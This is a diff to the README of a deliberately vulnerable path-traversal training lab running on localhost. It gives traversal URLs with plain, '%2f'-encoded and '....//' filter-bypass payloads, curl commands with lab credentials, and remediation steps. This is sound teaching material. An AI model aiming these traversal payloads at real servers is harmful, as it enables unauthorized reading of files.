@@ -21,15 +21,15 @@ npm install
 npm run dev
 ```
 
-Open **`http://localhost:3004/login`**.
+Open **`http://localhost:3004/login`** (stay on `localhost` for the whole lab — cookies do not carry to `127.0.0.1`).
 
 ## Layout
 
 ```text
 server/
   content/library/books/{book}/chapters/   # intended chapter files
-  data/internal/                             # traversal target (not static)
-  public/uploads/                            # placeholder for File upload lab
+  .gitignore                                 # traversal target (not served as static)
+  public/uploads/                            # next lab — rules in .gitignore
 ```
 
 ## API (this lab)
@@ -37,9 +37,25 @@ server/
 | Request | Meaning |
 |---------|---------|
 | `GET /library/books/gone-with-the-wind/chapters/chapter-01.txt` | Legal chapter (after login) |
-| `…/chapters/../../../../../data/internal/publisher-rebates.csv` | Traversal (exercise 2) |
+| `…/chapters/..%2f..%2f..%2f..%2f..%2f.gitignore` | Traversal (main exercise — exercise 2) |
 
 Handler joins `content/library/books/{book}/chapters/` + user-controlled path segment(s) — see [`routes/library.ts`](server/src/routes/library.ts).
+
+## Why not plain `../` in the address bar?
+
+Clients often **normalize** paths. For example, this URL:
+
+```http
+/library/books/gone-with-the-wind/chapters/../../../../../.gitignore
+```
+
+may be sent as:
+
+```http
+/.gitignore
+```
+
+That request **never hits** the library route (no handler → **404**). The app is still vulnerable when the payload reaches `/library/books/…/chapters/…` with traversal inside the segment — use **encoded slashes** below or `curl --path-as-is` in demos.
 
 ## Exercises
 
@@ -49,38 +65,57 @@ Handler joins `content/library/books/{book}/chapters/` + user-controlled path se
 
 Login as `marc` → `/members` → **Pobierz rozdział 1 (TXT)**.
 
-### 2. `../` in the path
+### 2. Encoded traversal (`%2f`) — primary attack
 
-From the legal URL, append traversal after `…/chapters/` (five `../` to reach `server/`, then `data/internal/…`):
+Same idea as WSTG: one path segment, slashes as `%2f`. Target: [`server/.gitignore`](server/.gitignore) (upload rules, not meant for members).
 
-```http
-GET /library/books/gone-with-the-wind/chapters/../../../../../data/internal/publisher-rebates.csv
-```
-
-Some browsers **normalize** `../` in the path before the request leaves the client; if the URL “snaps back”, use exercise 3 or send the request with **`curl --path-as-is`** (instructor demo).
-
-### 3. Encoded traversal
-
-Single path segment with encoded slashes (same target file), e.g. last segment:
-
-```text
-..%2f..%2f..%2f..%2f..%2fdata%2finternal%2fpublisher-rebates.csv
-```
-
-Full path:
+Paste in the address bar while signed in:
 
 ```http
-GET /library/books/gone-with-the-wind/chapters/..%2f..%2f..%2f..%2f..%2fdata%2finternal%2fpublisher-rebates.csv
+http://localhost:3004/library/books/gone-with-the-wind/chapters/..%2f..%2f..%2f..%2f..%2f.gitignore
 ```
+
+You should see the `.gitignore` text (e.g. `public/uploads/*`).
+
+Five `%2f` steps climb from `…/chapters/` to the `server/` directory, then `.gitignore`.
+
+**curl:**
+
+```bash
+curl -c /tmp/pt.jar -b /tmp/pt.jar -X POST http://localhost:3004/login \
+  -d 'login=marc&password=marc123' -L -o /dev/null
+
+curl -b /tmp/pt.jar \
+  'http://localhost:3004/library/books/gone-with-the-wind/chapters/..%2f..%2f..%2f..%2f..%2f.gitignore'
+```
+
+Uploaded files stay out of git — see [server/.gitignore](server/.gitignore).
+
+### 3. Plain `../` segments (optional demo)
+
+Only when the client sends the path **without** normalizing:
+
+```bash
+curl -b /tmp/pt.jar --path-as-is \
+  'http://localhost:3004/library/books/gone-with-the-wind/chapters/../../../../../.gitignore'
+```
+
+Browsers usually normalize this form — use exercise 2 on the workshop floor.
 
 ### 4. (Optional) Bad `replace("../")` bypass
 
-Enable **Exercise 4** block in [`routes/library.ts`](server/src/routes/library.ts), then try `....//....//....//....//....//data/internal/publisher-rebates.csv`.
+Enable **Exercise 4** block in [`routes/library.ts`](server/src/routes/library.ts), then try a single segment such as:
+
+```text
+....//....//....//....//....//.gitignore
+```
+
+(CWE-35 debrief.)
 
 ### Fix
 
-Uncomment **fix A** (jail under `…/chapters/`) or **fix B** (allowlist `bookSlug` + `chapterFile`) in [`routes/library.ts`](server/src/routes/library.ts). Repeat exercises 2–3 → blocked.
+Uncomment **fix A** (jail under `…/chapters/`) or **fix B** (allowlist `bookSlug` + `chapterFile`) in [`routes/library.ts`](server/src/routes/library.ts). Repeat exercise 2 → **Not allowed** / **403**.
 
 ## Next module
 
-**File upload** → `POST /account/avatar` into `public/uploads/` (CWE-434). Read vs write: different URL, different fixes.
+**File upload** → `POST /account/avatar` into `public/uploads/` (CWE-434). Ignore rules: [server/.gitignore](server/.gitignore). Read vs write: different URL, different fixes.
